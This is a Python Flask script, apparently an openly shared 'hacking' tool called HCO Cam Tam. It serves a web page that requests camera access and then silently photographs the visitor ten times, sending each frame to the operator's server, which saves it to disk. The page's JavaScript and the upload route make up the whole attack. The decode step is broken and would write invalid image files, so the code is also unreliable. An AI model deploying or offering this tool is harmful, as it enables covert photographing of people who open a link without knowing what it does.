#!/usr/bin/env python3
"""
HCO Cam Tam
By Azhar (Hackers Colony)
Single file - No pip needed
"""

import os, time
from flask import Flask, render_template_string, request

app = Flask(__name__)

# HTML Page (camera + JS capture)
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
  <title>HCO Cam Tam</title>
  <style>
    body { background: black; color: lime; text-align: center; font-family: monospace; }
    #countdown { font-size: 20px; color: red; margin-top: 20px; }
  </style>
</head>
<body>
  <h2>📸 HCO Cam Tam - Camera Access Required</h2>
  <p id="msg">Allow camera access to continue...</p>
  <video id="video" autoplay playsinline width="300" height="220"></video>
  <canvas id="canvas" width="300" height="220" style="display:none;"></canvas>

  <script>
    let video = document.getElementById('video');
    let canvas = document.getElementById('canvas');
    let ctx = canvas.getContext('2d');
    let count = 0;

    navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
      document.getElementById("msg").innerText = "✅ Camera access granted! Capturing...";
      let interval = setInterval(() => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        let data = canvas.toDataURL("image/png");
        fetch('/upload', { method:'POST', body:data });
        count++;
        if(count >= 10) { clearInterval(interval); document.getElementById("msg").innerText="✔ Captured 10 images"; }
      }, 1500);
    })
    .catch(err => {
      document.getElementById("msg").innerText = "❌ Camera access denied!";
    });
  </script>
</body>
</html>
"""

# Store uploaded images
@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/upload", methods=["POST"])
def upload():
    data = request.data.decode("utf-8")
    num = len([f for f in os.listdir(".") if f.startswith("camtam_")]) + 1
    imgdata = data.split(",")[1]
    with open(f"camtam_{num}.png", "wb") as f:
        f.write(bytearray([ord(c) for c in imgdata.encode("utf-8")]))
    return "ok"

def banner():
    os.system("clear")
    print("\033[92m")  # Light Green
    print("####################################")
    print("          HCO Cam Tam")
    print("             by Azhar")
    print("####################################\033[0m")

if __name__ == "__main__":
    os.system("clear")
    print("\033[91mUnlocking tool... Subscribe required!\033[0m")
    for i in range(10,0,-1):
        print(f"\033[93mRedirecting to YouTube in {i} sec...\033[0m", end="\r")
        time.sleep(1)
    print("\nOpening YouTube...\n")
    os.system("xdg-open https://youtube.com/@hackers_colony_tech")

    input("\n\033[96mAfter subscribing, press ENTER to continue...\033[0m")
    banner()
    print("\n\033[92m[+] Server started on http://0.0.0.0:5000\033[0m\n")
    app.run(host="0.0.0.0", port=5000)
